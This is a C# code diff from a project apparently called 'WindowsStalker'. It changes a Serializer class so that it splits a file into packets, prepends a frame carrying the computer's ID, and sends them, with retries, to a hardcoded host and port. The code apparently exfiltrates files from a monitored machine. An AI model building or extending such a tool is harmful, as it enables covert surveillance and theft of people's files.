@@ -2,15 +2,35 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Threading;
 
 namespace WindowsStalker
 {
     public class Serializer
     {
+        private string _address = "192.168.0.200";
+        private int _port = 8888;
         private const int _packetSize = 256;
         private Sender _sender;
+        private int _attempts = 3;
 
-        public List<byte[]> SendFile(string path, byte dataType)
+        public void SendFile(string path, byte dataType)
+        {
+            for (int i = 0; i < _attempts; ++i)
+            {
+                List<byte[]> splitedFile = SplitFile(path, dataType);
+                if (splitedFile != null)
+                {
+                    if (SendSplitedFile(splitedFile))
+                    {
+                        break;
+                    }
+                }
+            }
+            _sender.CloseConnection();
+        }
+        
+        public List<byte[]> SplitFile(string path, byte dataType)
         {
             using(var fileStream = new FileStream(path, FileMode.Open))
             {
@@ -39,8 +59,11 @@ namespace WindowsStalker
                 int filesize = byteCount + (byteCount2 * 256);
                 Console.WriteLine("File size: " + filesize);
 
+                List<byte[]> regFrames = GetRegisterFrames();
+
                 byte[] firstFrame = {dataType, byteCount2, byteCount, (byte)lastFrameSize};
                 splitedFile.Insert(0, firstFrame);
+                splitedFile.InsertRange(0, regFrames);
 
                 return splitedFile;
             }
@@ -54,21 +77,30 @@ namespace WindowsStalker
             return send;
         }
 
-        public List<byte[]> SplitFile()
+        public List<byte[]> GetRegisterFrames()
         {
-            List<byte[]> toSend = new List<byte[]>();
-            byte[] partOne = {1, 0, 1, 3};
-            byte[] partTwo = {120, 100, 100};
+            List<byte[]> frames = new List<byte[]>();
+            string id = Program.GetComputerID();
+            byte[] frame = new byte[_packetSize];
+            int length = id.Length;
 
-            toSend.Add(partOne);
-            toSend.Add(partTwo);
+            frame[0] = Convert.ToByte('w');
+            for (int i = 1; i <= length; i++)
+            {
+                frame[i] = Convert.ToByte(id.ElementAt(i - 1));
+            }
 
-            return toSend;
+            byte[] regFrame = {0, 0, 1, (byte)(length + 1)};
+
+            frames.Add(regFrame);
+            frames.Add(frame);
+
+            return frames;
         }
 
         public bool SendSplitedFile(List<byte[]> splitedFile)
         {
-            _sender = new Sender("192.168.0.199", 8888);
+            _sender = new Sender(_address, _port);
             bool started = _sender.StartSender();
             if (!started)
             {
